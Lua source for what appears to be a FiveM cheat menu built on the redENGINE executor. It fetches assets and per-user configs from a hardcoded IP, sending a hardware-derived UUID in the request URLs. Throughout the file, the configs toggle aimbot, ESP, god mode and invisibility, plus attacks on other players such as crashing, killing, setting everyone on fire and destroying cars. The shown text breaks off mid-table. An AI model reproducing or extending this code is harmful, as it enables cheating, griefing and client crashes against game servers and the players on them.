redENGINE.EnableCustomDesign("v1");

CreateThread(function()
    local result, font = redENGINE.Fonts.AddFromUrl("http://37.187.39.183/ImageZM/noodle.ttf", 13.0)

    if not result then
        error('failed wtf', 2);
    end

    while not font.IsLoaded() do
        Wait(25);
    end

    local zm = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/finalUI.png")
    local zm2 = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/testfinal.png")
    local checkboxred = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/circlered.png")
    local checkboxgreen = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/circlegreen.png")
    local cursortest = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/testcusrors.png") -- playeraimbotpng.png
    local cursopedbonertest = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/playeraimbotpng.png")
    local circle = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/circle.png")
    local ouioui = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/ouioui.png")

    local banner = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/banner.png")
    local sep = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/seperator.png")
    local arrow = redENGINE.AddImageFromUrl("http://37.187.39.183/ImageZM/arrow.png")


Citizen.CreateThread(function()
    local ZM_M1000 = {}
    local CIT = Citizen
    local WAIT = Wait
    UUID = tostring(Citizen.InvokeNative(0x762376233638, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()))



    function mysplit(inputstr, sep)
        if sep == nil then
            sep = "%s"
        end
        local t = {}
        for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
            table.insert(t, str)
        end
        return t
    end

    function intToString(int)
        local str = tostring(int)
        if str:len() == 1 then
            str = "0" .. str
        end
        return str
    end

function searchconfig()
        getValue = redENGINE.Request:Get("http://37.187.39.183/configzm/"..UUID.."/", {field = "data"})

            cfg1 = mysplit(getValue, " ")[39]
            cfg2 = mysplit(getValue, " ")[48]
            cfg3 = mysplit(getValue, " ")[57]
            cfg4 = mysplit(getValue, " ")[66]
            cfg5 = mysplit(getValue, " ")[75]

            if string.len(intToString(cfg1)) <= 4 or cfg1 == nil or cfg1 == tostring(nil) then
                finalconfig1 = "no slot"
            else
                finalconfig1 = string.gmatch(cfg1, "%d+_(.-).txt")()
            end

            if string.len(intToString(cfg2)) <= 4 or cfg2 == nil or cfg2 == tostring(nil) then
                finalconfig2 = "no slot"
            else
                finalconfig2 = string.gmatch(cfg2, "%d+_(.-).txt")()
            end

            if string.len(intToString(cfg3)) <= 4 or cfg3 == nil or cfg3 == tostring(nil) then
                finalconfig3 = "no slot"
            else
                finalconfig3 = string.gmatch(cfg3, "%d+_(.-).txt")()
            end

            if string.len(intToString(cfg4)) <= 4 or cfg4 == nil or cfg4 == tostring(nil)then
                finalconfig4 = "no slot"
            else
                finalconfig4 = string.gmatch(cfg4, "%d+_(.-).txt")()
            end

            if string.len(intToString(cfg5)) <= 4 or cfg5 == nil or cfg5 == tostring(nil) then
                finalconfig5 = "no slot"
            else
                finalconfig5 = string.gmatch(cfg5, "%d+_(.-).txt")()
            end


    end

--- searchconfig()




    local disable = "0"
    local enable = "1"

    local mousemenu = false
    local keyboardmenu = false
    local externmenu = false
    local firstpage = true
    local i = 255
    local v = 0.32
    local home = true

    local saveconfig = true
    local head = true
    local bWait = 0
    local move = {
        x = 0.0,
        y = 0.0,
    }
    local New = {
        x = 0.0,
        y = 0.0,
        opacity = 0,
        scroll = 0.0,
        scroll2 = 0.0,
        scroll3 = 0.0,
        scroll5 = 0.0,
        scroll6 = 0.0,
        scroll7 = 0.0,
        scroll8 = 0.0,
        scroll9 = 0.0,
        scroll10 = 0.0,
        scroll11 = 0.0,
        scroll12 = 0.0,
        scroll13 = 0.0,
        scroll14 = 0.0,
        scrolls = 0.0,
        scrolls2 = 0.0,
        slideBar = 0.0,
        scrolls3 = 0.0,
        scrolls5 = 0.0,
        time = 0,
        active = true,
        kmh = 3.6,
        jailamlroptipr = 0.04,
        jaill = 0.04,
        jaill2 = 0.0
    }

    local New2 = {
        x = 0.0,
        y = 0.0
    }

    local Mode = 1
    local ModeCar = 1
    local bite = true

Citizen.CreateThread(function()
    while bite do
        Wait(0)

        if finalconfig1 then
            location1 = UUID.."/"..UUID.."_"..finalconfig1..".txt"
        end

        if finalconfig2 then
            location2 = UUID.."/"..UUID.."_"..finalconfig2..".txt"
        end

        if finalconfig3 then
            location3 = UUID.."/"..UUID.."_"..finalconfig3..".txt"
        end

        if finalconfig4 then
            location4 = UUID.."/"..UUID.."_"..finalconfig4..".txt"
        end

        if finalconfig5 then
            location5 = UUID.."/"..UUID.."_"..finalconfig5..".txt"
        end

        if selectconfig1 then
            getCheck = redENGINE.Request:Get("http://37.187.39.183/configzm/"..location1, {field = "data"})
            ZM_M1000 = {
                np = str_to_bool(mysplit(getCheck, " ")[1]),
                gd = str_to_bool(mysplit(getCheck, " ")[2]),
                ivs = str_to_bool(mysplit(getCheck, " ")[3]),
                fst = str_to_bool(mysplit(getCheck, " ")[4]),
                stmn = str_to_bool(mysplit(getCheck, " ")[5]),
                ncl = str_to_bool(mysplit(getCheck, " ")[6]),
                authl = str_to_bool(mysplit(getCheck, " ")[7]),
                fkd = str_to_bool(mysplit(getCheck, " ")[8]),
                fstswin = str_to_bool(mysplit(getCheck, " ")[9]),
                opplayer = str_to_bool(mysplit(getCheck, " ")[10]),
                rollinfinity = str_to_bool(mysplit(getCheck, " ")[11]),
                nrgl = str_to_bool(mysplit(getCheck, " ")[12]),
                jp = str_to_bool(mysplit(getCheck, " ")[13]),
                fcra = str_to_bool(mysplit(getCheck, " ")[14]),
                boxes = str_to_bool(mysplit(getCheck, " ")[15]),
                skelt = str_to_bool(mysplit(getCheck, " ")[16]),
                plname = str_to_bool(mysplit(getCheck, " ")[17]),
                tvision = str_to_bool(mysplit(getCheck, " ")[18]),
                nivision = str_to_bool(mysplit(getCheck, " ")[19]),
                wcolor = str_to_bool(mysplit(getCheck, " ")[20]),
                line = str_to_bool(mysplit(getCheck, " ")[21]),
                bllplp = str_to_bool(mysplit(getCheck, " ")[22]),
                nwater = str_to_bool(mysplit(getCheck, " ")[23]),
                nprops = str_to_bool(mysplit(getCheck, " ")[24]),
                hbar = str_to_bool(mysplit(getCheck, " ")[25]),
                abar = str_to_bool(mysplit(getCheck, " ")[26]),
                rmvfog = str_to_bool(mysplit(getCheck, " ")[27]),
                chair = str_to_bool(mysplit(getCheck, " ")[28]),
                blps = str_to_bool(mysplit(getCheck, " ")[29]),
                eweapon = str_to_bool(mysplit(getCheck, " ")[30]),
                cnight = str_to_bool(mysplit(getCheck, " ")[31]),
                icnself = str_to_bool(mysplit(getCheck, " ")[32]),
                icnpeds = str_to_bool(mysplit(getCheck, " ")[33]),
                flbox = str_to_bool(mysplit(getCheck, " ")[34]),
                speammo = str_to_bool(mysplit(getCheck, " ")[35]),
                tgdead = str_to_bool(mysplit(getCheck, " ")[36]),
                tgped = str_to_bool(mysplit(getCheck, " ")[37]),
                pwall = str_to_bool(mysplit(getCheck, " ")[38]),
                aimbot = str_to_bool(mysplit(getCheck, " ")[39]),
                amlck = str_to_bool(mysplit(getCheck, " ")[40]),
                infiniammo = str_to_bool(mysplit(getCheck, " ")[41]),
                rpdfire = str_to_bool(mysplit(getCheck, " ")[42]),
                nospread = str_to_bool(mysplit(getCheck, " ")[43]),
                shootp = str_to_bool(mysplit(getCheck, " ")[44]),
                ptfxbullet = str_to_bool(mysplit(getCheck, " ")[45]),
                drawbullet = str_to_bool(mysplit(getCheck, " ")[46]),
                antihd = str_to_bool(mysplit(getCheck, " ")[47]),
                hitmarker = str_to_bool(mysplit(getCheck, " ")[48]),
                fov = str_to_bool(mysplit(getCheck, " ")[49]),
                fillfov = str_to_bool(mysplit(getCheck, " ")[50]),
                head = str_to_bool(mysplit(getCheck, " ")[51]),
                shoulder = str_to_bool(mysplit(getCheck, " ")[52]),
                shoulder2 = str_to_bool(mysplit(getCheck, " ")[53]),
                pelvis = str_to_bool(mysplit(getCheck, " ")[54]),
                feet = str_to_bool(mysplit(getCheck, " ")[55]),
                feet2 = str_to_bool(mysplit(getCheck, " ")[56]),
                kneel = str_to_bool(mysplit(getCheck, " ")[57]),
                kneer = str_to_bool(mysplit(getCheck, " ")[58]),
                vbrajke = str_to_bool(mysplit(getCheck, " ")[59]),
                vinvisible = str_to_bool(mysplit(getCheck, " ")[60]),
                vdrift = str_to_bool(mysplit(getCheck, " ")[61]),
                vboost = str_to_bool(mysplit(getCheck, " ")[62]),
                vjump = str_to_bool(mysplit(getCheck, " ")[63]),
                handling = str_to_bool(mysplit(getCheck, " ")[64]),
                autrepair = str_to_bool(mysplit(getCheck, " ")[65]),
                vnitro = str_to_bool(mysplit(getCheck, " ")[66]),
                rcar = str_to_bool(mysplit(getCheck, " ")[67]),
                vcol = str_to_bool(mysplit(getCheck, " ")[68]),
                spawninside = str_to_bool(mysplit(getCheck, " ")[69]),
                spec = str_to_bool(mysplit(getCheck, " ")[70]),
                fdplayer = str_to_bool(mysplit(getCheck, " ")[71]),
                mtvplayer = str_to_bool(mysplit(getCheck, " ")[72]),
                tzplayer = str_to_bool(mysplit(getCheck, " ")[73]),
                hyplayer = str_to_bool(mysplit(getCheck, " ")[74]),
                killplayerrr = str_to_bool(mysplit(getCheck, " ")[75]),
                cgplayerm100teb = str_to_bool(mysplit(getCheck, " ")[76]),
                spermecar = str_to_bool(mysplit(getCheck, " ")[77]),
                launchplayer = str_to_bool(mysplit(getCheck, " ")[78]),
                cgplayer = str_to_bool(mysplit(getCheck, " ")[79]),
                crashplayer = str_to_bool(mysplit(getCheck, " ")[80]),
                ptfxspamming = str_to_bool(mysplit(getCheck, " ")[81]),
                waterplayer = str_to_bool(mysplit(getCheck, " ")[82]),
                molotovallp = str_to_bool(mysplit(getCheck, " ")[83]),
                whaleplayer = str_to_bool(mysplit(getCheck, " ")[84]),
                destroycars = str_to_bool(mysplit(getCheck, " ")[85]),
                asas = str_to_bool(mysplit(getCheck, " ")[86]),
                musicclip = str_to_bool(mysplit(getCheck, " ")[87]),
                rnhud = str_to_bool(mysplit(getCheck, " ")[88]),
                atznshot = str_to_bool(mysplit(getCheck, " ")[89]),
                stmnshot = str_to_bool(mysplit(getCheck, " ")[90]),
                tlportovehicle = str_to_bool(mysplit(getCheck, " ")[91]),
                gmdglife = str_to_bool(mysplit(getCheck, " ")[92]),
                infammo = str_to_bool(mysplit(getCheck, " ")[93]),
                espltbag = str_to_bool(mysplit(getCheck, " ")[94]),
                strf = str_to_bool(mysplit(getCheck, " ")[95]),
                tlpzmb = str_to_bool(mysplit(getCheck, " ")[96]),
                autfrmxp = str_to_bool(mysplit(getCheck, " ")[97]),
                autfrm = str_to_bool(mysplit(getCheck, " ")[98]),
                rmvwindows = str_to_bool(mysplit(getCheck, " ")[99]),
                wrpthevehicle = str_to_bool(mysplit(getCheck, " ")[100]),
                frrzmo = str_to_bool(mysplit(getCheck, " ")[101]),
            }
            ZM_M1000.Draw = true
        end
        if selectconfig2 then
            getCheck = redENGINE.Request:Get("http://37.187.39.183/configzm/"..location2, {field = "data"})
            ZM_M1000 = {
                np = str_to_bool(mysplit(getCheck, " ")[1]),
                gd = str_to_bool(mysplit(getCheck, " ")[2]),
                ivs = str_to_bool(mysplit(getCheck, " ")[3]),
                fst = str_to_bool(mysplit(getCheck, " ")[4]),
                stmn = str_to_bool(mysplit(getCheck, " ")[5]),
                ncl = str_to_bool(mysplit(getCheck, " ")[6]),
                authl = str_to_bool(mysplit(getCheck, " ")[7]),
                fkd = str_to_bool(mysplit(getCheck, " ")[8]),
                fstswin = str_to_bool(mysplit(getCheck, " ")[9]),
                opplayer = str_to_bool(mysplit(getCheck, " ")[10]),
                rollinfinity = str_to_bool(mysplit(getCheck, " ")[11]),
                nrgl = str_to_bool(mysplit(getCheck, " ")[12]),
                jp = str_to_bool(mysplit(getCheck, " ")[13]),
                fcra = str_to_bool(mysplit(getCheck, " ")[14]),
                boxes = str_to_bool(mysplit(getCheck, " ")[15]),
                skelt = str_to_bool(mysplit(getCheck, " ")[16]),
                plname = str_to_bool(mysplit(getCheck, " ")[17]),
                tvision = str_to_bool(mysplit(getCheck, " ")[18]),
                nivision = str_to_bool(mysplit(getCheck, " ")[19]),
                wcolor = str_to_bool(mysplit(getCheck, " ")[20]),
                line = str_to_bool(mysplit(getCheck, " ")[21]),
                bllplp = str_to_bool(mysplit(getCheck, " ")[22]),
                nwater = str_to_bool(mysplit(getCheck, " ")[23]),
                nprops = str_to_bool(mysplit(getCheck, " ")[24]),
                hbar = str_to_bool(mysplit(getCheck, " ")[25]),
                abar = str_to_bool(mysplit(getCheck, " ")[26]),
                rmvfog = str_to_bool(mysplit(getCheck, " ")[27]),
                chair = str_to_bool(mysplit(getCheck, " ")[28]),
                blps = str_to_bool(mysplit(getCheck, " ")[29]),
                eweapon = str_to_bool(mysplit(getCheck, " ")[30]),
                cnight = str_to_bool(mysplit(getCheck, " ")[31]),
                icnself = str_to_bool(mysplit(getCheck, " ")[32]),
                icnpeds = str_to_bool(mysplit(getCheck, " ")[33]),
                flbox = str_to_bool(mysplit(getCheck, " ")[34]),
                speammo = str_to_bool(mysplit(getCheck, " ")[35]),
                tgdead = str_to_bool(mysplit(getCheck, " ")[36]),
                tgped = str_to_bool(mysplit(getCheck, " ")[37]),
                pwall = str_to_bool(mysplit(getCheck, " ")[38]),
                aimbot = str_to_bool(mysplit(getCheck, " ")[39]),
                amlck = str_to_bool(mysplit(getCheck, " ")[40]),
                infiniammo = str_to_bool(mysplit(getCheck, " ")[41]),
                rpdfire = str_to_bool(mysplit(getCheck, " ")[42]),
                nospread = str_to_bool(mysplit(getCheck, " ")[43]),
                shootp = str_to_bool(mysplit(getCheck, " ")[44]),
                ptfxbullet = str_to_bool(mysplit(getCheck, " ")[45]),
                drawbullet = str_to_bool(mysplit(getCheck, " ")[46]),
                antihd = str_to_bool(mysplit(getCheck, " ")[47]),
                hitmarker = str_to_bool(mysplit(getCheck, " ")[48]),
                fov = str_to_bool(mysplit(getCheck, " ")[49]),
                fillfov = str_to_bool(mysplit(getCheck, " ")[50]),
                head = str_to_bool(mysplit(getCheck, " ")[51]),
                shoulder = str_to_bool(mysplit(getCheck, " ")[52]),
                shoulder2 = str_to_bool(mysplit(getCheck, " ")[53]),
                pelvis = str_to_bool(mysplit(getCheck, " ")[54]),
                feet = str_to_bool(mysplit(getCheck, " ")[55]),
                feet2 = str_to_bool(mysplit(getCheck, " ")[56]),
                kneel = str_to_bool(mysplit(getCheck, " ")[57]),
                kneer = str_to_bool(mysplit(getCheck, " ")[58]),
                vbrajke = str_to_bool(mysplit(getCheck, " ")[59]),
                vinvisible = str_to_bool(mysplit(getCheck, " ")[60]),
                vdrift = str_to_bool(mysplit(getCheck, " ")[61]),
                vboost = str_to_bool(mysplit(getCheck, " ")[62]),
                vjump = str_to_bool(mysplit(getCheck, " ")[63]),
                handling = str_to_bool(mysplit(getCheck, " ")[64]),
                autrepair = str_to_bool(mysplit(getCheck, " ")[65]),
                vnitro = str_to_bool(mysplit(getCheck, " ")[66]),
                rcar = str_to_bool(mysplit(getCheck, " ")[67]),
                vcol = str_to_bool(mysplit(getCheck, " ")[68]),
                spawninside = str_to_bool(mysplit(getCheck, " ")[69]),
                spec = str_to_bool(mysplit(getCheck, " ")[70]),
                fdplayer = str_to_bool(mysplit(getCheck, " ")[71]),
                mtvplayer = str_to_bool(mysplit(getCheck, " ")[72]),
                tzplayer = str_to_bool(mysplit(getCheck, " ")[73]),
                hyplayer = str_to_bool(mysplit(getCheck, " ")[74]),
                killplayerrr = str_to_bool(mysplit(getCheck, " ")[75]),
                cgplayerm100teb = str_to_bool(mysplit(getCheck, " ")[76]),
                spermecar = str_to_bool(mysplit(getCheck, " ")[77]),
                launchplayer = str_to_bool(mysplit(getCheck, " ")[78]),
                cgplayer = str_to_bool(mysplit(getCheck, " ")[79]),
                crashplayer = str_to_bool(mysplit(getCheck, " ")[80]),
                ptfxspamming = str_to_bool(mysplit(getCheck, " ")[81]),
                waterplayer = str_to_bool(mysplit(getCheck, " ")[82]),
                molotovallp = str_to_bool(mysplit(getCheck, " ")[83]),
                whaleplayer = str_to_bool(mysplit(getCheck, " ")[84]),
                destroycars = str_to_bool(mysplit(getCheck, " ")[85]),
                asas = str_to_bool(mysplit(getCheck, " ")[86]),
                musicclip = str_to_bool(mysplit(getCheck, " ")[87]),
                rnhud = str_to_bool(mysplit(getCheck, " ")[88]),
                atznshot = str_to_bool(mysplit(getCheck, " ")[89]),
                stmnshot = str_to_bool(mysplit(getCheck, " ")[90]),
                tlportovehicle = str_to_bool(mysplit(getCheck, " ")[91]),
                gmdglife = str_to_bool(mysplit(getCheck, " ")[92]),
                infammo = str_to_bool(mysplit(getCheck, " ")[93]),
                espltbag = str_to_bool(mysplit(getCheck, " ")[94]),
                strf = str_to_bool(mysplit(getCheck, " ")[95]),
                tlpzmb = str_to_bool(mysplit(getCheck, " ")[96]),
                autfrmxp = str_to_bool(mysplit(getCheck, " ")[97]),
                autfrm = str_to_bool(mysplit(getCheck, " ")[98]),
                rmvwindows = str_to_bool(mysplit(getCheck, " ")[99]),
                wrpthevehicle = str_to_bool(mysplit(getCheck, " ")[100]),
                frrzmo = str_to_bool(mysplit(getCheck, " ")[101]),
            }
            ZM_M1000.Draw = true
        end
        if selectconfig3 then
            getCheck = redENGINE.Request:Get("http://37.187.39.183/configzm/"..location3, {field = "data"})
            ZM_M1000 = {
                np = str_to_bool(mysplit(getCheck, " ")[1]),
                gd = str_to_bool(mysplit(getCheck, " ")[2]),
                ivs = str_to_bool(mysplit(getCheck, " ")[3]),
                fst = str_to_bool(mysplit(getCheck, " ")[4]),
                stmn = str_to_bool(mysplit(getCheck, " ")[5]),
                ncl = str_to_bool(mysplit(getCheck, " ")[6]),
                authl = str_to_bool(mysplit(getCheck, " ")[7]),
                fkd = str_to_bool(mysplit(getCheck, " ")[8]),
                fstswin = str_to_bool(mysplit(getCheck, " ")[9]),
                opplayer = str_to_bool(mysplit(getCheck, " ")[10]),
                rollinfinity = str_to_bool(mysplit(getCheck, " ")[11]),
                nrgl = str_to_bool(mysplit(getCheck, " ")[12]),
                jp = str_to_bool(mysplit(getCheck, " ")[13]),
                fcra = str_to_bool(mysplit(getCheck, " ")[14]),
                boxes = str_to_bool(mysplit(getCheck, " ")[15]),
                skelt = str_to_bool(mysplit(getCheck, " ")[16]),
                plname = str_to_bool(mysplit(getCheck, " ")[17]),
                tvision = str_to_bool(mysplit(getCheck, " ")[18]),
                nivision = str_to_bool(mysplit(getCheck, " ")[19]),
                wcolor = str_to_bool(mysplit(getCheck, " ")[20]),
                line = str_to_bool(mysplit(getCheck, " ")[21]),
                bllplp = str_to_bool(mysplit(getCheck, " ")[22]),
                nwater = str_to_bool(mysplit(getCheck, " ")[23]),
                nprops = str_to_bool(mysplit(getCheck, " ")[24]),
                hbar = str_to_bool(mysplit(getCheck, " ")[25]),
                abar = str_to_bool(mysplit(getCheck, " ")[26]),
                rmvfog = str_to_bool(mysplit(getCheck, " ")[27]),
                chair = str_to_bool(mysplit(getCheck, " ")[28]),
                blps = str_to_bool(mysplit(getCheck, " ")[29]),
                eweapon = str_to_bool(mysplit(getCheck, " ")[30]),
                cnight = str_to_bool(mysplit(getCheck, " ")[31]),
                icnself = str_to_bool(mysplit(getCheck, " ")[32]),
                icnpeds = str_to_bool(mysplit(getCheck, " ")[33]),
                flbox = str_to_bool(mysplit(getCheck, " ")[34]),
                speammo = str_to_bool(mysplit(getCheck, " ")[35]),
                tgdead = str_to_bool(mysplit(getCheck, " ")[36]),
                tgped = str_to_bool(mysplit(getCheck, " ")[37]),
                pwall = str_to_bool(mysplit(getCheck, " ")[38]),
                aimbot = str_to_bool(mysplit(getCheck, " ")[39]),
                amlck = str_to_bool(mysplit(getCheck, " ")[40]),
                infiniammo = str_to_bool(mysplit(getCheck, " ")[41]),
                rpdfire = str_to_bool(mysplit(getCheck, " ")[42]),
                nospread = str_to_bool(mysplit(getCheck, " ")[43]),
                shootp = str_to_bool(mysplit(getCheck, " ")[44]),
                ptfxbullet = str_to_bool(mysplit(getCheck, " ")[45]),
                drawbullet = str_to_bool(mysplit(getCheck, " ")[46]),
                antihd = str_to_bool(mysplit(getCheck, " ")[47]),
                hitmarker = str_to_bool(mysplit(getCheck, " ")[48]),
                fov = str_to_bool(mysplit(getCheck, " ")[49]),
                fillfov = str_to_bool(mysplit(getCheck, " ")[50]),
                head = str_to_bool(mysplit(getCheck, " ")[51]),
                shoulder = str_to_bool(mysplit(getCheck, " ")[52]),
                shoulder2 = str_to_bool(mysplit(getCheck, " ")[53]),
                pelvis = str_to_bool(mysplit(getCheck, " ")[54]),
                feet = str_to_bool(mysplit(getCheck, " ")[55]),
                feet2 = str_to_bool(mysplit(getCheck, " ")[56]),
                kneel = str_to_bool(mysplit(getCheck, " ")[57]),
                kneer = str_to_bool(mysplit(getCheck, " ")[58]),
                vbrajke = str_to_bool(mysplit(getCheck, " ")[59]),
                vinvisible = str_to_bool(mysplit(getCheck, " ")[60]),
                vdrift = str_to_bool(mysplit(getCheck, " ")[61]),
                vboost = str_to_bool(mysplit(getCheck, " ")[62]),
                vjump = str_to_bool(mysplit(getCheck, " ")[63]),
                handling = str_to_bool(mysplit(getCheck, " ")[64]),
                autrepair = str_to_bool(mysplit(getCheck, " ")[65]),
                vnitro = str_to_bool(mysplit(getCheck, " ")[66]),
                rcar = str_to_bool(mysplit(getCheck, " ")[67]),
                vcol = str_to_bool(mysplit(getCheck, " ")[68]),
                spawninside = str_to_bool(mysplit(getCheck, " ")[69]),
                spec = str_to_bool(mysplit(getCheck, " ")[70]),
                fdplayer = str_to_bool(mysplit(getCheck, " ")[71]),
                mtvplayer = str_to_bool(mysplit(getCheck, " ")[72]),
                tzplayer = str_to_bool(mysplit(getCheck, " ")[73]),
                hyplayer = str_to_bool(mysplit(getCheck, " ")[74]),
                killplayerrr = str_to_bool(mysplit(getCheck, " ")[75]),
                cgplayerm100teb = str_to_bool(mysplit(getCheck, " ")[76]),
                spermecar = str_to_bool(mysplit(getCheck, " ")[77]),
                launchplayer = str_to_bool(mysplit(getCheck, " ")[78]),
                cgplayer = str_to_bool(mysplit(getCheck, " ")[79]),
                crashplayer = str_to_bool(mysplit(getCheck, " ")[80]),
                ptfxspamming = str_to_bool(mysplit(getCheck, " ")[81]),
                waterplayer = str_to_bool(mysplit(getCheck, " ")[82]),
                molotovallp = str_to_bool(mysplit(getCheck, " ")[83]),
                whaleplayer = str_to_bool(mysplit(getCheck, " ")[84]),
                destroycars = str_to_bool(mysplit(getCheck, " ")[85]),
                asas = str_to_bool(mysplit(getCheck, " ")[86]),
                musicclip = str_to_bool(mysplit(getCheck, " ")[87]),
                rnhud = str_to_bool(mysplit(getCheck, " ")[88]),
                atznshot = str_to_bool(mysplit(getCheck, " ")[89]),
                stmnshot = str_to_bool(mysplit(getCheck, " ")[90]),
                tlportovehicle = str_to_bool(mysplit(getCheck, " ")[91]),
                gmdglife = str_to_bool(mysplit(getCheck, " ")[92]),
                infammo = str_to_bool(mysplit(getCheck, " ")[93]),
                espltbag = str_to_bool(mysplit(getCheck, " ")[94]),
                strf = str_to_bool(mysplit(getCheck, " ")[95]),
                tlpzmb = str_to_bool(mysplit(getCheck, " ")[96]),
                autfrmxp = str_to_bool(mysplit(getCheck, " ")[97]),
                autfrm = str_to_bool(mysplit(getCheck, " ")[98]),
                rmvwindows = str_to_bool(mysplit(getCheck, " ")[99]),
                wrpthevehicle = str_to_bool(mysplit(getCheck, " ")[100]),
                frrzmo = str_to_bool(mysplit(getCheck, " ")[101]),
            }
            ZM_M1000.Draw = true
        end
        if selectconfig4 then
            getCheck = redENGINE.Request:Get("http://37.187.39.183/configzm/"..location4, {field = "data"})
            ZM_M1000 = {
                np = str_to_bool(mysplit(getCheck, " ")[1]),
                gd = str_to_bool(mysplit(getCheck, " ")[2]),
                ivs = str_to_bool(mysplit(getCheck, " ")[3]),
                fst = str_to_bool(mysplit(getCheck, " ")[4]),
                stmn = str_to_bool(mysplit(getCheck, " ")[5]),
                ncl = str_to_bool(mysplit(getCheck, " ")[6]),
                authl = str_to_bool(mysplit(getCheck, " ")[7]),
                fkd = str_to_bool(mysplit(getCheck, " ")[8]),
                fstswin = str_to_bool(mysplit(getCheck, " ")[9]),
                opplayer = str_to_bool(mysplit(getCheck, " ")[10]),
                rollinfinity = str_to_bool(mysplit(getCheck, " ")[11]),
                nrgl = str_to_bool(mysplit(getCheck, " ")[12]),
                jp = str_to_bool(mysplit(getCheck, " ")[13]),
                fcra = str_to_bool(mysplit(getCheck, " ")[14]),
                boxes = str_to_bool(mysplit(getCheck, " ")[15]),
                skelt = str_to_bool(mysplit(getCheck, " ")[16]),
                plname = str_to_bool(mysplit(getCheck, " ")[17]),
                tvision = str_to_bool(mysplit(getCheck, " ")[18]),
                nivision = str_to_bool(mysplit(getCheck, " ")[19]),
                wcolor = str_to_bool(mysplit(getCheck, " ")[20]),
                line = str_to_bool(mysplit(getCheck, " ")[21]),
                bllplp = str_to_bool(mysplit(getCheck, " ")[22]),
                nwater = str_to_bool(mysplit(getCheck, " ")[23]),
                nprops = str_to_bool(mysplit(getCheck, " ")[24]),
                hbar = str_to_bool(mysplit(getCheck, " ")[25]),
                abar = str_to_bool(mysplit(getCheck, " ")[26]),
                rmvfog = str_to_bool(mysplit(getCheck, " ")[27]),
                chair = str_to_bool(mysplit(getCheck, " ")[28]),
                blps = str_to_bool(mysplit(getCheck, " ")[29]),
                eweapon = str_to_bool(mysplit(getCheck, " ")[30]),
                cnight = str_to_bool(mysplit(getCheck, " ")[31]),
                icnself = str_to_bool(mysplit(getCheck, " ")[32]),
                icnpeds = str_to_bool(mysplit(getCheck, " ")[33]),
                flbox = str_to_bool(mysplit(getCheck, " ")[34]),
                speammo = str_to_bool(mysplit(getCheck, " ")[35]),
                tgdead = str_to_bool(mysplit(getCheck, " ")[36]),
                tgped = str_to_bool(mysplit(getCheck, " ")[37]),
                pwall = str_to_bool(mysplit(getCheck, " ")[38]),
                aimbot = str_to_bool(mysplit(getCheck, " ")[39]),
                amlck = str_to_bool(mysplit(getCheck, " ")[40]),
                infiniammo = str_to_bool(mysplit(getCheck, " ")[41]),
                rpdfire = str_to_bool(mysplit(getCheck, " ")[42]),
                nospread = str_to_bool(mysplit(getCheck, " ")[43]),
                shootp = str_to_bool(mysplit(getCheck, " ")[44]),
                ptfxbullet = str_to_bool(mysplit(getCheck, " ")[45]),
                drawbullet = str_to_bool(mysplit(getCheck, " ")[46]),
                antihd = str_to_bool(mysplit(getCheck, " ")[47]),
                hitmarker = str_to_bool(mysplit(getCheck, " ")[48]),
                fov = str_to_bool(mysplit(getCheck, " ")[49]),
                fillfov = str_to_bool(mysplit(getCheck, " ")[50]),
                head = str_to_bool(mysplit(getCheck, " ")[51]),
                shoulder = str_to_bool(mysplit(getCheck, " ")[52]),
                shoulder2 = str_to_bool(mysplit(getCheck, " ")[53]),
                pelvis = str_to_bool(mysplit(getCheck, " ")[54]),
                feet = str_to_bool(mysplit(getCheck, " ")[55]),
                feet2 = str_to_bool(mysplit(getCheck, " ")[56]),
                kneel = str_to_bool(mysplit(getCheck, " ")[57]),
                kneer = str_to_bool(mysplit(getCheck, " ")[58]),
                vbrajke = str_to_bool(mysplit(getCheck, " ")[59]),
                vinvisible = str_to_bool(mysplit(getCheck, " ")[60]),
                vdrift = str_to_bool(mysplit(getCheck, " ")[61]),
                vboost = str_to_bool(mysplit(getCheck, " ")[62]),
                vjump = str_to_bool(mysplit(getCheck, " ")[63]),
                handling = str_to_bool(mysplit(getCheck, " ")[64]),
                autrepair = str_to_bool(mysplit(getCheck, " ")[65]),
                vnitro = str_to_bool(mysplit(getCheck, " ")[66]),
                rcar = str_to_bool(mysplit(getCheck, " ")[67]),
                vcol = str_to_bool(mysplit(getCheck, " ")[68]),
                spawninside = str_to_bool(mysplit(getCheck, " ")[69]),
                spec = str_to_bool(mysplit(getCheck, " ")[70]),
                fdplayer = str_to_bool(mysplit(getCheck, " ")[71]),
                mtvplayer = str_to_bool(mysplit(getCheck, " ")[72]),
                tzplayer = str_to_bool(mysplit(getCheck, " ")[73]),
                hyplayer = str_to_bool(mysplit(getCheck, " ")[74]),
                killplayerrr = str_to_bool(mysplit(getCheck, " ")[75]),
                cgplayerm100teb = str_to_bool(mysplit(getCheck, " ")[76]),
                spermecar = str_to_bool(mysplit(getCheck, " ")[77]),
                launchplayer = str_to_bool(mysplit(getCheck, " ")[78]),
                cgplayer = str_to_bool(mysplit(getCheck, " ")[79]),
                crashplayer = str_to_bool(mysplit(getCheck, " ")[80]),
                ptfxspamming = str_to_bool(mysplit(getCheck, " ")[81]),
                waterplayer = str_to_bool(mysplit(getCheck, " ")[82]),
                molotovallp = str_to_bool(mysplit(getCheck, " ")[83]),
                whaleplayer = str_to_bool(mysplit(getCheck, " ")[84]),
                destroycars = str_to_bool(mysplit(getCheck, " ")[85]),
                asas = str_to_bool(mysplit(getCheck, " ")[86]),
                musicclip = str_to_bool(mysplit(getCheck, " ")[87]),
                rnhud = str_to_bool(mysplit(getCheck, " ")[88]),
                atznshot = str_to_bool(mysplit(getCheck, " ")[89]),
                stmnshot = str_to_bool(mysplit(getCheck, " ")[90]),
                tlportovehicle = str_to_bool(mysplit(getCheck, " ")[91]),
                gmdglife = str_to_bool(mysplit(getCheck, " ")[92]),
                infammo = str_to_bool(mysplit(getCheck, " ")[93]),
                espltbag = str_to_bool(mysplit(getCheck, " ")[94]),
